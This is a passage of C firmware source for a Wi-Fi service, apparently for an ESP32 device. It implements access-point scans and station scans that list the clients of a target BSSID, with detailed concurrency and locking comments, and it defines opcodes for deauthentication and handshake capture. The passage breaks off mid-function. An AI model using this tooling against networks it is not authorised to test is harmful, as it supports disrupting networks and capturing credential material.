/* Clean-room implementation from MonstaTek contract. Portable: no ESP-IDF
 * dependency, host-testable against mtek_wifi_hal_t (fake HAL for host tests,
 * real ESP-IDF HAL on target). */
#include "mtek_wifi_service.h"
#include "mtek_schema_structs.h"
#include "mtek_schema_message_descs.h"
#include "mtek_codec_api.h"
#include "mtek_arbiter.h"
#include "mtek_router.h"
#include <string.h>
#include <stdint.h>

/* The (service_id, originating
 * START opcode) each token-addressed handler passes to the mtk_op_*_family core
 * APIs so a token minted by a DIFFERENT operation family (e.g. a live STA_SCAN
 * token handed to AP_SCAN_STOP) is rejected NOT_FOUND with zero side effect,
 * instead of being found and acted upon. Each STOP/STATUS/READ opcode consumes a
 * token minted by its family's own START. */
#define WIFI_SERVICE_ID        0x0001
#define AP_SCAN_START_OPCODE   0x0001
#define STA_SCAN_START_OPCODE  0x0006
#define DEAUTH_START_OPCODE    0x0010
#define HANDSHAKE_START_OPCODE 0x0013

#define WIFI_MAX_AP 50
#define WIFI_MAX_STA 32
#define HANDSHAKE_MAX_BYTES 2048

static const mtk_wifi_hal_t *s_hal;
static uint64_t (*s_now_ms)(void);
static uint8_t s_soft_mode_baseline = 0; /* 0=STA */
static uint8_t s_radio_quarantined;

/* See mtek_wifi_service.h's own doc comment on mtek_wifi_service_set_lock for
 * the full rationale. Guards s_deauth and s_hs (declared with their own usage
 * further down this file). */
static mtk_wifi_lock_fn s_wifi_lock, s_wifi_unlock;
void mtek_wifi_service_set_lock(mtk_wifi_lock_fn lock, mtk_wifi_lock_fn unlock) { s_wifi_lock = lock; s_wifi_unlock = unlock; }
static void wifi_lock(void) { if (s_wifi_lock) s_wifi_lock(); }
static void wifi_unlock(void) { if (s_wifi_unlock) s_wifi_unlock(); }

/* M3 correction (independent review P0 "the D->H handoff uses a coherent
 * but unstable snapshot and an unconditional release"): test-only pause
 * seam -- see its own doc comment in mtek_wifi_service.h. Always NULL in
 * production. */
static mtk_wifi_dh_handoff_pause_hook_t s_dh_handoff_pause_hook;
void mtek_wifi_set_dh_handoff_pause_hook(mtk_wifi_dh_handoff_pause_hook_t hook) { s_dh_handoff_pause_hook = hook; }

/* A real TSan run found a genuine data race between a long-running loop's own
 * `while (!mtk_op_state_is_terminal(rec->state))` condition (a raw, unlocked
 * dereference of a RETAINED record pointer, read repeatedly across many loop
 * iterations -- exactly the hazard mtek_core.h's own doc comment on mtk_op_find
 * warns about, "a session that RETAINS a mtk_operation_record_t* across multiple
 * separate calls/ticks/ callbacks") and a concurrent STOP's own
 * mtk_op_transition write to the SAME record. mtk_op_transition's own return
 * value already correctly linearizes which caller performs cleanup (a separate,
 * already-fixed concern) -- this closes the OTHER, distinct hazard: the loop's
 * own repeated "should I keep going" check must go through a locked snapshot,
 * not a raw pointer read, even though a stale read here was always logically
 * benign (worst case: one extra loop iteration before noticing termination).
 * Fails safe (treats "not found" as terminal). */
static int op_is_terminal_now(uint32_t token, uint32_t boot_epoch) {
    mtk_operation_record_t snap;
    if (!mtk_op_snapshot(token, boot_epoch, &snap)) return 1;
    return mtk_op_state_is_terminal(snap.state);
}

void mtek_wifi_set_hal(const mtk_wifi_hal_t *hal) { s_hal = hal; }
const mtk_wifi_hal_t *mtek_wifi_get_hal(void) { return s_hal; }
void mtek_wifi_service_init(uint64_t (*now_ms_fn)(void)) { s_now_ms = now_ms_fn; }
void mtek_wifi_service_tick(void) {
    if (s_hal && s_hal->promisc_service) s_hal->promisc_service();
    /* Drains queued captive-portal submissions, for a HAL that defers delivery
     * out of its HTTP server's own task rather than calling straight through. */
    if (s_hal && s_hal->portal_service) s_hal->portal_service();
}
int mtek_wifi_restore_and_release(mtk_arbiter_class_t owner_class, uint32_t owner_token) {
    int rc = (s_hal && s_hal->restore_sta_mode) ? s_hal->restore_sta_mode() : 0;
    wifi_lock();
    s_radio_quarantined = (rc != 0);
    wifi_unlock();
    if (rc == 0) mtk_arbiter_release_if_owner(owner_class, owner_token);
    return rc;
}
int mtek_wifi_radio_is_quarantined(void) {
    wifi_lock();
    int quarantined = s_radio_quarantined;
    wifi_unlock();
    return quarantined;
}
static uint64_t now_ms(void) { return s_now_ms ? s_now_ms() : 0; }

/* Shared WS (AP/STA scan) quiescence-and-fence helper, used by BOTH
 * mtek_wifi_cancel_active_for_peer_reset (a peer reset) and handle_wifi_stop_all
 * (an ordinary user-invoked STOP) -- signals cancellation, waits bounded for the
 * worker's own natural completion, and on a genuine timeout force-finalizes the
 * TOKEN ONLY (never the arbiter/radio, which stays
 * handle_ap_scan_start's/handle_sta_scan_ start's own tail's sole responsibility
 * once its real blocking ap_scan/sta_scan call actually returns). Kept as ONE
 * implementation so the two callers can never independently drift. */
static void wifi_quiesce_and_fence_ws(uint32_t tok, uint32_t epoch) {
    if (s_hal && s_hal->ap_scan_cancel) s_hal->ap_scan_cancel();
    if (s_hal && s_hal->sta_scan_cancel) s_hal->sta_scan_cancel();
    const int max_iters = 20;
    int became_terminal = 0;
    for (int i = 0; i < max_iters; i++) {
        mtk_operation_record_t snap;
        if (!mtk_op_snapshot(tok, epoch, &snap) || mtk_op_state_is_terminal(snap.state)) { became_terminal = 1; break; }
        if (s_hal && s_hal->quiescence_wait_ms) s_hal->quiescence_wait_ms(50);
    }
    if (!became_terminal && mtk_op_claim_finalization(tok, epoch)) {
        mtk_op_transition_by_token(tok, epoch, MTK_OPS_STOPPED, MTK_STATUS_OK, now_ms());
    }
}

static void respond(mtk_request_ctx_t *ctx, uint8_t status, const void *body, const mtk_struct_desc_t *desc) {
    ctx->sink.emit_response(ctx->sink.user, ctx->correlation, status, body, desc);
}
static void respond_empty(mtk_request_ctx_t *ctx, uint8_t status) {
    ctx->sink.emit_response(ctx->sink.user, ctx->correlation, status, NULL, NULL);
}

static mtk_hal_mac6_t to_hal_mac(mtk_mac6_t m) { mtk_hal_mac6_t h; memcpy(h.b, m.b, 6); return h; }
static mtk_mac6_t from_hal_mac(mtk_hal_mac6_t h) { mtk_mac6_t m; memcpy(m.b, h.b, 6); return m; }
static mtk_ipv4_t from_hal_ip(mtk_hal_ipv4_t h) { mtk_ipv4_t m; memcpy(m.b, h.b, 4); return m; }
static mtk_hal_ipv4_t to_hal_ip(mtk_ipv4_t m) { mtk_hal_ipv4_t h; memcpy(h.b, m.b, 4); return h; }

/* AP scan ----------------------------- */

static struct { uint32_t generation; uint16_t count; mtk_aprecord_t items[WIFI_MAX_AP]; } s_ap;

static void handle_ap_scan_start(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                  const uint8_t *req_bytes, size_t req_len) {
    mtk_ap_scan_start_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) {
        respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return;
    }
    if (req.band == 1 /* BAND_5GHZ */) { respond_empty(ctx, MTK_STATUS_UNSUPPORTED); return; }
    /* Admission is now held under the same lock that serializes
     * mtk_core_bump_session_ generation, from final session validation through
     * arbiter ownership publication and the ACCEPTED response, so a peer-session
     * reset can never observe a token-backed class owned by a not-yet-real token
     * -- see mtk_op_begin_admission_guard's own doc comment (mtek_core.h). */
    if (!mtk_op_begin_admission_guard(ctx->session_generation)) { respond_empty(ctx, MTK_STATUS_NOT_READY); return; }
    int no_mem = 0;
    /* The identity is copied out atomically at mint time -- no raw record
     * pointer is retained past this point; my_token/my_epoch below (used
     * throughout this function's own already-established token/epoch-only async
     * continuation) are simply this identity's own fields. */
    mtk_op_id_t id = mtk_op_alloc_id(op->service_id, op->opcode, now_ms(), &no_mem);
    if (id.token == 0) { respond_empty(ctx, MTK_STATUS_NO_MEMORY); mtk_op_end_admission_guard(); return; }
    /* Publishes the REAL token in the SAME arbiter call -- never
     * acquire(class, 0) followed by a later force_transfer(class, token),
     * exactly the half-published sequence this guard exists to close. */
    if (mtk_arbiter_acquire(MTK_ARB_WS, id.token) != MTK_ARB_GRANT_OK) {
        mtk_op_discard_unpublished(id.token, id.boot_epoch);
        respond_empty(ctx, MTK_STATUS_BUSY);
        mtk_op_end_admission_guard();
        return;
    }
    mtk_op_transition_by_token(id.token, id.boot_epoch, MTK_OPS_RUNNING, MTK_STATUS_OK, now_ms());

    mtk_ap_scan_start_resp_t r; r.operation_token = id.token;
    respond(ctx, MTK_STATUS_ACCEPTED, &r, &mtk_ap_scan_start_resp_t_desc);
    mtk_op_end_admission_guard();

    mtk_hal_ap_record_t hal_out[WIFI_MAX_AP];
    uint8_t fixed_channel = (req.channel_plan.mode == 0) ? req.channel_plan.channel : 0;
    uint32_t my_token = id.token, my_epoch = id.boot_epoch;
    /* Owner-approved correction (previously flagged for approval as a
     * strict-List-A behavior change, now approved): a negative return is a real
     * transactional-entry failure (callback/channel/promiscuous- mode step
     * inside esp32_ap_scan, e.g. capture_prior_state_once failing, or
     * esp_wifi_set_mode/_start failing) -- previously silently rewritten to 0
     * and reported as "scan completed, 0 APs found", indistinguishable from a
     * genuine empty result. Same linearization and honest-failure shape as
     * handle_sta_scan_start's own identical fix, extended here to AP scan. */
    int n = s_hal && s_hal->ap_scan ? s_hal->ap_scan(req.band, fixed_channel, 30000, hal_out, WIFI_MAX_AP) : -1;

    /* Restore/release below is now attempted UNCONDITIONALLY
     * (mtek_wifi_restore_and_ release's own atomic ownership check decides
     * whether the release half actually takes effect), independent of whether
     * this worker also wins the op-table claim. A peer-reset canceller may have
     * already forced this exact token to a terminal state after its own bounded
     * quiescence wait timed out (see mtek_wifi_cancel_active_ for_peer_reset's
     * WS branch) while this worker's blocking HAL call is still genuinely
     * running; in that case `won` is false here (the canceller already claimed
     * finalization) but the arbiter class is still owned by my_token (the
     * canceller deliberately never touches it), so this call is still the ONE
     * place that safely performs the real restore and release once the HAL call
     * genuinely returns -- skipping it would permanently orphan the WS arbiter
     * class.
     *
     * State publish/terminal transition/event emission remain strictly gated on
     * `won`, PLUS mtk_op_begin_publish_guard, held across the ENTIRE publish
     * (never merely a single point-in-time re-check, which cannot close the
     * window between itself returning and the actual publish executing -- see
     * mtek_op_begin_publish_ guard's own doc comment in mtek_core.h for why).
     * `won` alone only proves nobody else finalized this token BEFORE this exact
     * instant; it says nothing about a peer-session reset landing in the window
     * between winning and actually publishing/emitting -- the guard closes that
     * window to zero width by making it mutually exclusive with
     * mtk_core_bump_session_generation itself. restore/release happens OUTSIDE
     * the guard (a real, potentially slow HAL round-trip that must never block a
     * peer-session reset); only the fast, fully-in-memory state write + event
     * emit are held under it. */
    if (n < 0) {
        int won = mtk_op_claim_finalization(my_token, my_epoch);
        mtek_wifi_restore_and_release(MTK_ARB_WS, my_token);
        if (won) {
            mtk_op_transition_by_token(my_token, my_epoch, MTK_OPS_FAILED, MTK_STATUS_IO_ERROR, now_ms());
        }
        if (won && mtk_op_begin_publish_guard(ctx->session_generation)) {
            mtk_ap_scan_complete_ev_t ev = {0};
            ev.operation_token = my_token; ev.status = MTK_STATUS_IO_ERROR;
            ctx->sink.emit_event(ctx->sink.user, my_token, "AP_SCAN_COMPLETE", &ev, &mtk_ap_scan_complete_ev_t_desc);
            mtk_op_end_publish_guard();
        }
        return;
    }
    if ((unsigned)n > WIFI_MAX_AP) n = WIFI_MAX_AP;

    int won = mtk_op_claim_finalization(my_token, my_epoch);

    /* Owner-approved correction: restore/release now go through the
     * shared wrapper (previously AP scan never called restore_sta_
     * mode at all, leaving the captured prior-state snapshot forever
     * un-cleared -- see docs/DECISION_LOG.md's RC11 "discovered, not
     * fixed" note, closed together with this same approval) -- a
     * restore failure downgrades the reported status and keeps the
     * lease quarantined rather than releasing it over unconfirmed
     * radio state. Called unconditionally -- see mtek_wifi_restore_
     * and_release's own doc comment for why no ownership pre-check is
     * needed here any more. Runs BEFORE the publish guard below: a real
     * HAL round-trip must never be held under the same lock a peer-
     * session reset needs. */
    int restore_rc = mtek_wifi_restore_and_release(MTK_ARB_WS, my_token);
    uint8_t final_status = (restore_rc == 0) ? MTK_STATUS_OK : MTK_STATUS_IO_ERROR;
    if (won) {
        mtk_op_transition_by_token(my_token, my_epoch, MTK_OPS_COMPLETED, final_status, now_ms());
    }
    if (won && mtk_op_begin_publish_guard(ctx->session_generation)) {
        /* (audit extended to s_ap too): this write can run on a different worker
         * task than a concurrent AP_SCAN_STATUS/RESULTS_PAGE/DETAILS read of the
         * exact same struct -- guard the whole publish with this file's own
         * established wifi_lock/unlock (mtek_wifi_service_set_lock), matching
         * s_deauth/s_hs's own RC8 fix. The results themselves are published here
         * (they are real and correct; only the radio-restoration step, already
         * handled above, was ever in question). */
        wifi_lock();
        s_ap.generation = my_token;
        s_ap.count = (uint16_t)n;
        for (int i = 0; i < n; i++) {
            s_ap.items[i].bssid = from_hal_mac(hal_out[i].bssid);
            s_ap.items[i].ssid.len = hal_out[i].ssid_len;
            memcpy(s_ap.items[i].ssid.data, hal_out[i].ssid, hal_out[i].ssid_len);
            s_ap.items[i].channel = hal_out[i].channel;
            s_ap.items[i].rssi = hal_out[i].rssi;
            s_ap.items[i].authmode = hal_out[i].authmode;
        }
        uint32_t published_generation = s_ap.generation;
        uint16_t published_count = s_ap.count;
        wifi_unlock();

        mtk_ap_scan_complete_ev_t ev = {0};
        ev.operation_token = my_token; ev.status = final_status;
        ev.result_generation = published_generation; ev.result_count = published_count;
        ctx->sink.emit_event(ctx->sink.user, my_token, "AP_SCAN_COMPLETE", &ev, &mtk_ap_scan_complete_ev_t_desc);
        mtk_op_end_publish_guard();
    }
}

static void handle_ap_scan_status(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                   const uint8_t *req_bytes, size_t req_len) {
    mtk_ap_scan_status_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) {
        respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return;
    }
    mtk_operation_record_t snap;
    if (!mtk_op_snapshot_family(req.operation_token, ctx->boot_epoch, WIFI_SERVICE_ID, AP_SCAN_START_OPCODE, &snap)) { respond_empty(ctx, MTK_STATUS_NOT_FOUND); return; }
    mtk_ap_scan_status_resp_t r; r.state = (uint8_t)snap.state;
    wifi_lock(); r.found_so_far = s_ap.count; wifi_unlock();
    respond(ctx, MTK_STATUS_OK, &r, &mtk_ap_scan_status_resp_t_desc);
}

static void handle_ap_scan_results_page(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                         const uint8_t *req_bytes, size_t req_len) {
    mtk_ap_scan_results_page_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) {
        respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return;
    }
    wifi_lock();
    if (req.result_generation != s_ap.generation || s_ap.generation == 0) {
        wifi_unlock();
        respond_empty(ctx, MTK_STATUS_NOT_FOUND); return;
    }
    uint8_t max_items = req.max_items ? req.max_items : 50;
    if (max_items > 50) max_items = 50;
    mtk_ap_scan_results_page_resp_t r; memset(&r, 0, sizeof(r));
    uint16_t i = (uint16_t)req.start_index, n = 0;
    for (; i < s_ap.count && n < max_items; i++, n++) r.items.items[n] = s_ap.items[i];
    r.items.count = n;
    r.next_index = (i < s_ap.count) ? i : 0;
    wifi_unlock();
    respond(ctx, MTK_STATUS_OK, &r, &mtk_ap_scan_results_page_resp_t_desc);
}

/* Owner-approved correction: a real quiescence handshake, mirroring
 * handle_sta_scan_stop's own identical fix exactly, now that
 * esp32_ap_scan_cancel exists (mtek_wifi_hal_esp32.c's own RC11 addition) to
 * make an in-flight esp_wifi_scan_start(..., true) return promptly instead of
 * waiting out its own full duration. STOP no longer transitions or
 * restores/releases itself -- it only SIGNALS cancellation and waits (bounded)
 * for handle_ap_scan_start's own worker to reach a terminal state, which alone
 * ever performs restore/release for this opcode (never both paths). A timeout
 * that is not yet terminal reports BUSY, never a false STOPPED/BUSY-free claim. */
static void handle_ap_scan_stop(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                 const uint8_t *req_bytes, size_t req_len) {
    mtk_ap_scan_stop_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) {
        respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return;
    }
    /* The outer existence check is now mtk_op_snapshot too (never a retained
     * mtk_op_find pointer) -- my_token/my_epoch are simply the caller's own
     * request fields (already exactly what a successful find would have echoed
     * back), so no pointer of any kind needs to survive past this one call. */
    mtk_operation_record_t snap;
    /* Family gate -- a token minted by any family other than AP_SCAN_START is
     * rejected NOT_FOUND here, before any cancel signal, arbiter, radio, or
     * worker interaction. */
    if (!mtk_op_snapshot_family(req.operation_token, ctx->boot_epoch, WIFI_SERVICE_ID, AP_SCAN_START_OPCODE, &snap)) { respond_empty(ctx, MTK_STATUS_NOT_FOUND); return; }
    uint32_t my_token = req.operation_token, my_epoch = ctx->boot_epoch;

    /* Already terminal (natural completion, or an earlier STOP call,
     * already ran) -- nothing to signal or wait for. */
    if (mtk_op_snapshot(my_token, my_epoch, &snap)) {
        if (mtk_op_state_is_terminal(snap.state)) {
            mtk_ap_scan_stop_resp_t r; r.final_state = (uint8_t)snap.state; r.final_status = snap.final_status;
            respond(ctx, MTK_STATUS_OK, &r, &mtk_ap_scan_stop_resp_t_desc);
            return;
        }
    } else {
        /* Not found under the real (mtk_core-internal) token/epoch pair
         * any more -- fail-safe: treat as already terminal rather than
         * wait for something that no longer exists. */
        mtk_ap_scan_stop_resp_t r; memset(&r, 0, sizeof(r));
        respond(ctx, MTK_STATUS_OK, &r, &mtk_ap_scan_stop_resp_t_desc);
        return;
    }

    /* Signal cancellation -- makes an in-flight ap_scan (blocked inside
     * esp_wifi_scan_start(..., true) on another task) return promptly
     * instead of up to its full requested duration. Harmless no-op if
     * nothing is actually in flight (every single-threaded host test's
     * own synchronous fallback) or if the HAL predates this (NULL-safe). */
    if (s_hal && s_hal->ap_scan_cancel) s_hal->ap_scan_cancel();

    /* Bounded wait for handle_ap_scan_start's own worker to reach a
     * terminal state -- it alone performs restore/release for this
     * opcode, exactly once, when it gets there. Same ~20 x 50ms = 1s
     * bound as handle_sta_scan_stop's own identical wait. */
    const int max_iters = 20;
    int became_terminal = 0;
    for (int i = 0; i < max_iters; i++) {
        if (mtk_op_snapshot(my_token, my_epoch, &snap) && mtk_op_state_is_terminal(snap.state)) { became_terminal = 1; break; }
        if (!mtk_op_snapshot(my_token, my_epoch, &snap)) { became_terminal = 1; break; } /* fail-safe: gone means terminal */
        if (s_hal && s_hal->quiescence_wait_ms) s_hal->quiescence_wait_ms(50);
    }

    if (became_terminal) {
        mtk_ap_scan_stop_resp_t r; r.final_state = (uint8_t)snap.state; r.final_status = snap.final_status;
        respond(ctx, MTK_STATUS_OK, &r, &mtk_ap_scan_stop_resp_t_desc);
    } else {
        /* Bounded timeout expired and the worker still has not reached a
         * terminal state -- it may still be touching the radio. Do NOT
         * claim STOPPED, do NOT touch restore/arbiter (that remains the
         * worker's own job alone): report BUSY so the caller knows to
         * retry STATUS/STOP rather than assume the radio is free. */
        mtk_ap_scan_stop_resp_t r; r.final_state = (uint8_t)snap.state; r.final_status = snap.final_status;
        respond(ctx, MTK_STATUS_BUSY, &r, &mtk_ap_scan_stop_resp_t_desc);
    }
}

static void handle_ap_details(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                               const uint8_t *req_bytes, size_t req_len) {
    mtk_ap_details_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) {
        respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return;
    }
    wifi_lock();
    if (req.result_generation != s_ap.generation || req.index >= s_ap.count) {
        wifi_unlock();
        respond_empty(ctx, MTK_STATUS_NOT_FOUND); return;
    }
    mtk_ap_details_resp_t r; r.record = s_ap.items[req.index];
    wifi_unlock();
    respond(ctx, MTK_STATUS_OK, &r, &mtk_ap_details_resp_t_desc);
}

/* Station-target scan ---------------------- */

static struct {
    uint32_t generation; uint16_t count; mtk_stationrecord_t items[WIFI_MAX_STA];
    mtk_mac6_t ap_bssid; uint8_t channel;
} s_sta;

static void handle_sta_scan_start(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                   const uint8_t *req_bytes, size_t req_len) {
    mtk_sta_scan_start_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) {
        respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return;
    }
    if (req.channel < 1 || req.channel > 13) { respond_empty(ctx, MTK_STATUS_INVALID_ARGUMENT); return; }
    /* See handle_ap_scan_start's identical comment above. */
    if (!mtk_op_begin_admission_guard(ctx->session_generation)) { respond_empty(ctx, MTK_STATUS_NOT_READY); return; }
    int no_mem = 0;
    /* The identity is copied out atomically at mint time -- no raw record
     * pointer is retained past this point, including across the ACCEPTED
     * response and the (potentially long-running/deferred) sta_scan HAL call
     * below. */
    mtk_op_id_t id = mtk_op_alloc_id(op->service_id, op->opcode, now_ms(), &no_mem);
    if (id.token == 0) { respond_empty(ctx, MTK_STATUS_NO_MEMORY); mtk_op_end_admission_guard(); return; }
    if (mtk_arbiter_acquire(MTK_ARB_WS, id.token) != MTK_ARB_GRANT_OK) {
        mtk_op_discard_unpublished(id.token, id.boot_epoch);
        respond_empty(ctx, MTK_STATUS_BUSY);
        mtk_op_end_admission_guard();
        return;
    }
    mtk_op_transition_by_token(id.token, id.boot_epoch, MTK_OPS_RUNNING, MTK_STATUS_OK, now_ms());

    mtk_sta_scan_start_resp_t r; r.operation_token = id.token;
    respond(ctx, MTK_STATUS_ACCEPTED, &r, &mtk_sta_scan_start_resp_t_desc);
    mtk_op_end_admission_guard();

    mtk_hal_station_record_t hal_out[WIFI_MAX_STA];
    mtk_hal_mac6_t hbssid = to_hal_mac(req.target_bssid);
    int n = s_hal && s_hal->sta_scan ? s_hal->sta_scan(hbssid, req.channel, req.duration_ms, hal_out, WIFI_MAX_STA) : -1;
    /* A negative return is a real transactional-entry failure
     * (callback/channel/promiscuous-mode step) -- previously silently rewritten
     * to 0 and reported as "scan completed, 0 stations found", indistinguishable
     * from a genuine empty result. Same linearization as every other List B
     * operation in this file: only the side that actually wins mtk_op_transition
     * performs cleanup/restore/emits the terminal event (a concurrent STOP --
     * now genuinely possible mid-scan via s_hal->sta_scan_cancel -- may have
     * already done so). */
    /* Both branches below used to call mtk_op_transition directly (locking in a
     * status BEFORE restore's real result was known) and release the arbiter
     * unconditionally regardless of that result -- defeating
     * mtek_wifi_restore_and_ release's own "quarantine on failure, never
     * release" contract. mtk_op_claim_finalization (claim) ->
     * mtek_wifi_restore_and_release (cleanup) -> mtk_op_transition_by_token
     * (truthful terminal write) is the same fixed shape as this file's own
     * handshake_finish/ deauth_finalize and mtek_capture_service.h's own
     * capture_teardown. */
    /* Restore/release below is called unconditionally (the atomic ownership
     * check now lives inside mtek_wifi_restore_and_ release itself), never
     * solely on winning the op-table claim, so a peer-reset canceller's forced
     * timeout finalization can never orphan the WS arbiter class while this
     * worker's blocking HAL call is still genuinely running. State publish/event
     * emission remain strictly gated on `won` AND mtk_op_begin_publish_guard,
     * held across the entire publish -- not a single point-in-time re-check,
     * which cannot close the window between itself returning and the actual
     * publish executing. restore/release always runs OUTSIDE the guard (a real,
     * potentially slow HAL round-trip). */
    if (n < 0) {
        int won = mtk_op_claim_finalization(id.token, id.boot_epoch);
        /* Already reporting IO_ERROR regardless of restore's own
         * result (status cannot get "more failed" than it already
         * is), but restore/release must still go through the shared
         * wrapper so a restore failure quarantines the lease instead
         * of releasing it over unconfirmed radio state. */
        mtek_wifi_restore_and_release(MTK_ARB_WS, id.token);
        if (won) {
            mtk_op_transition_by_token(id.token, id.boot_epoch, MTK_OPS_FAILED, MTK_STATUS_IO_ERROR, now_ms());
        }
        if (won && mtk_op_begin_publish_guard(ctx->session_generation)) {
            mtk_sta_scan_complete_ev_t ev = {0};
            ev.operation_token = id.token; ev.status = MTK_STATUS_IO_ERROR;
            ctx->sink.emit_event(ctx->sink.user, id.token, "STA_SCAN_COMPLETE", &ev, &mtk_sta_scan_complete_ev_t_desc);
            mtk_op_end_publish_guard();
        }
        return;
    }
    if ((unsigned)n > WIFI_MAX_STA) n = WIFI_MAX_STA;
    int won = mtk_op_claim_finalization(id.token, id.boot_epoch);

    /* + RC11 "keep the radio lease quarantined, never report/expose it as
     * healthy/free on a restore failure": downgrade only the reported status,
     * and let the shared wrapper decide whether the arbiter lease is actually
     * safe to release. Called unconditionally -- see
     * mtek_wifi_restore_and_release's own doc comment for why no ownership
     * pre-check is needed here any more. Runs BEFORE the publish guard below
     * (never held under the same lock a peer-session reset needs). */
    int restore_rc = mtek_wifi_restore_and_release(MTK_ARB_WS, id.token);
    uint8_t final_status = (restore_rc == 0) ? MTK_STATUS_OK : MTK_STATUS_IO_ERROR;
    if (won) {
        mtk_op_transition_by_token(id.token, id.boot_epoch, MTK_OPS_COMPLETED, final_status, now_ms());
    }
    if (won && mtk_op_begin_publish_guard(ctx->session_generation)) {
        /* s_sta can be read by handle_sta_scan_status/_results_page from a
         * concurrent worker task -- publish the whole snapshot under this file's
         * own established wifi_lock/unlock (mtek_wifi_service_set_lock). The
         * results themselves are published here (real and correct; only the
         * radio-restoration step, already handled above, was ever in question). */
        wifi_lock();
        s_sta.generation = id.token; s_sta.count = (uint16_t)n;
        s_sta.ap_bssid = req.target_bssid; s_sta.channel = req.channel;
        for (int i = 0; i < n; i++) { s_sta.items[i].mac = from_hal_mac(hal_out[i].mac); s_sta.items[i].rssi = hal_out[i].rssi; }
        uint32_t published_generation = s_sta.generation;
        uint16_t published_count = s_sta.count;
        wifi_unlock();

        mtk_sta_scan_complete_ev_t ev = {0};
        ev.operation_token = id.token;
        ev.status = final_status;
        ev.result_generation = published_generation; ev.result_count = published_count;
        ctx->sink.emit_event(ctx->sink.user, id.token, "STA_SCAN_COMPLETE", &ev, &mtk_sta_scan_complete_ev_t_desc);
        mtk_op_end_publish_guard();
    }
}

static void handle_sta_scan_status(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                    const uint8_t *req_bytes, size_t req_len) {
    mtk_sta_scan_status_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) { respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return; }
    mtk_operation_record_t snap;
    if (!mtk_op_snapshot_family(req.operation_token, ctx->boot_epoch, WIFI_SERVICE_ID, STA_SCAN_START_OPCODE, &snap)) { respond_empty(ctx, MTK_STATUS_NOT_FOUND); return; }
    mtk_sta_scan_status_resp_t r; r.state = (uint8_t)snap.state;
    wifi_lock(); r.found_so_far = s_sta.count; wifi_unlock();
    respond(ctx, MTK_STATUS_OK, &r, &mtk_sta_scan_status_resp_t_desc);
}

static void handle_sta_scan_results_page(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                          const uint8_t *req_bytes, size_t req_len) {
    mtk_sta_scan_results_page_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) { respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return; }
    wifi_lock();
    if (req.result_generation != s_sta.generation || s_sta.generation == 0) {
        wifi_unlock();
        respond_empty(ctx, MTK_STATUS_NOT_FOUND); return;
    }
    uint8_t max_items = req.max_items ? req.max_items : 32;
    if (max_items > 32) max_items = 32;
    mtk_sta_scan_results_page_resp_t r; memset(&r, 0, sizeof(r));
    uint16_t i = (uint16_t)req.start_index, n = 0;
    for (; i < s_sta.count && n < max_items; i++, n++) r.items.items[n] = s_sta.items[i];
    r.items.count = n; r.next_index = (i < s_sta.count) ? i : 0;
    wifi_unlock();
    respond(ctx, MTK_STATUS_OK, &r, &mtk_sta_scan_results_page_resp_t_desc);
}

/* This handler used to signal cancellation and IMMEDIATELY restore/release
 * itself, gated only on winning mtk_op_transition -- but esp32_sta_scan's own
 * blocking call can remain in flight for up to one poll interval (and its own
 * teardown afterward) after the cancel signal is seen, so a second operation
 * could acquire the "released" radio while the old worker was still tearing
 * down. STOP is now a real quiescence handshake instead: it only SIGNALS
 * cancellation, then waits (bounded) for handle_sta_scan_start's own worker to
 * actually reach a terminal state -- that worker remains the ONE place that ever
 * calls restore_sta_mode/releases the arbiter for this opcode (never both paths,
 * matching "do not restore from both STOP and worker paths"). A bounded timeout
 * that is NOT yet terminal fails safe: it reports BUSY (the radio may still be
 * in use) rather than falsely claiming STOPPED/BUSY-free. */
static void handle_sta_scan_stop(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                  const uint8_t *req_bytes, size_t req_len) {
    mtk_sta_scan_stop_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) { respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return; }
    /* The outer existence check is now mtk_op_snapshot too (never a retained
     * mtk_op_find pointer) -- my_token/my_epoch are simply the caller's own
     * request fields. Every read of the record's own state below goes through a
     * fresh locked mtk_op_snapshot (op_is_terminal_now's own doc comment, shared
     * with handle_deauth_start's identical rule) -- never a raw
     * `rec->state`/`rec->final_status` dereference retained across this
     * function's own bounded wait, which could otherwise observe a DIFFERENT
     * operation's data if this exact slot were recycled for a new token in the
     * meantime. */
    mtk_operation_record_t snap;
    /* Family gate (STA_SCAN_START) -- see handle_ap_scan_stop. */
